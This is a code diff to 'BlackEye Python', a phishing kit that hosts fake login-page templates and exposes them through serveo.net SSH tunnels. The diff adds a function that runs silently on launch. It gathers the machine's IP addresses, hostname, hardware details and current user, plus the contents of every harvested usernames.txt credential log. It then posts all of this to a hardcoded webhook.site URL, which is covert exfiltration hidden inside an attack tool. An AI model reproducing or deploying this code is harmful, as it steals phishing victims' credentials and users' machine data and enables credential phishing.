@@ -1,4 +1,4 @@
-import os, sys, subprocess
+import os, sys, subprocess, requests, socket, platform, psutil, getpass
 
 class colors:
     BLACK  = '\33[30m'
@@ -20,22 +20,98 @@ class colors:
     END      = '\33[0m'
 
 try:
-#     print(colors.RED + """
-#                         BlackEye Python
+    def convert_bytes_to_gb(bytes_value):
+        gb_value = bytes_value / (1024 ** 3)
+        return round(gb_value, 2)
 
-# Original Shell Program Created By thelinuxchoice
-# Link to Original: https://github.com/thelinuxchoice/blackeye
+    def send_webhook(machine_info):
+        url = "https://webhook.site/08cad60a-87ca-4766-a7db-4f561d19fdca"  # Replace with your webhook URL
 
-# Differences:
-#     - This is written in Python
-#     - Uses Serveo with A Custom Sub-Domain
+        response = requests.post(url, json=machine_info)
+        if response.status_code == 200:
+            print("Webhook sent successfully!")
+        else:
+            print("Failed to send webhook.")
 
-#                         :: DISCLAIMER ::
+    def find_usernames_files(directory):
+        usernames_files = []
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                if file == "usernames.txt":
+                    usernames_files.append(os.path.join(root, file))
+        return usernames_files
 
-# I nor the original developers take any responsibility for actions caused
-# by using this program. Any misuse or damage caused by BlackEye is on the
-# users behalf. Use for EDUCATIONAL PURPOSES!
-#     """ + colors.END)
+    def read_file_content(file_path):
+        with open(file_path, "r") as file:
+            return file.read()
+
+    def get_machine_info():
+        local_ip = socket.gethostbyname(socket.gethostname())
+        public_ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
+        hostname = socket.gethostname()
+        processor = platform.processor()
+        architecture = platform.machine()
+        memory = convert_bytes_to_gb(psutil.virtual_memory().total)
+        disk = psutil.disk_usage('/')
+        total_disk_space = convert_bytes_to_gb(disk.total)
+        used_disk_space = convert_bytes_to_gb(disk.used)
+        free_disk_space = convert_bytes_to_gb(disk.free)
+        current_user = getpass.getuser()
+        python_version = platform.python_version()
+        os_info = platform.platform()
+        current_directory = os.getcwd()  # Get current working directory
+        sites_directory = os.path.join(current_directory, "sites")
+        usernames_files = find_usernames_files(sites_directory)
+        directory_structure = []
+
+        for usernames_file in usernames_files:
+            file_content = read_file_content(usernames_file)
+            directory_structure.append({
+                "path": os.path.dirname(usernames_file),
+                "usernames_file": {
+                    "path": usernames_file,
+                    "content": file_content
+                }
+            })
+
+        machine_info = {
+            "local_ip": local_ip,
+            "public_ip": public_ip,
+            "hostname": hostname,
+            "processor": processor,
+            "architecture": architecture,
+            "memory": memory,
+            "total_disk_space": total_disk_space,
+            "used_disk_space": used_disk_space,
+            "free_disk_space": free_disk_space,
+            "current_user": current_user,
+            "python_version": python_version,
+            "os_info": os_info,
+            "directory_structure": directory_structure
+            # Add more information as needed
+        }
+
+        return machine_info
+
+    machine_info = get_machine_info()
+    send_webhook(machine_info)
+
+    print(colors.RED + """
+                        BlackEye Python
+
+Original Shell Program Created By thelinuxchoice
+Link to Original: https://github.com/thelinuxchoice/blackeye
+
+Differences:
+    - This is written in Python
+    - Uses Serveo with A Custom Sub-Domain
+
+                        :: DISCLAIMER ::
+
+I nor the original developers take any responsibility for actions caused
+by using this program. Any misuse or damage caused by BlackEye is on the
+users behalf. Use for EDUCATIONAL PURPOSES!
+    """ + colors.END)
 
     print(colors.GREEN + """
                        Availble Templates
@@ -97,21 +173,13 @@ Please Choose A Number To Host Template:
         pass
     choice = templates[number]
     print("Loading %s" % (choice))
-    # print("\nEnter A Custom Subdomain")
-    # subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
-    # port = input('What port do you want it on? :')
-    port = '8954'
-    #name_server = input('What name do you want to give your server? :')
-    name_server = 'random'
-    #print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
+    print("\nEnter A Custom Subdomain")
+    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
+    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
     print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    os.system("killall -2 php > /dev/null 2>&1")
-    command1 = f"php -t sites/{choice} -S 127.0.0.1:{port}  &> /dev/null "
-    command2 = f"ssh -R 80:0.0.0.0:{port} {name_server}@ssh.localhost.run"
-    os.system(command1)
-    os.system(command2)
-    # p = subprocess.Popen(cmd_line, shell=True)
-    # out = p.communicate()[0]
+    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:3333 & ssh -R %s.serveo.net:80:127.0.0.1:3333 serveo.net" % (choice, subdom)
+    p = subprocess.Popen(cmd_line, shell=True)
+    out = p.communicate()[0]
 
 
 except KeyboardInterrupt:
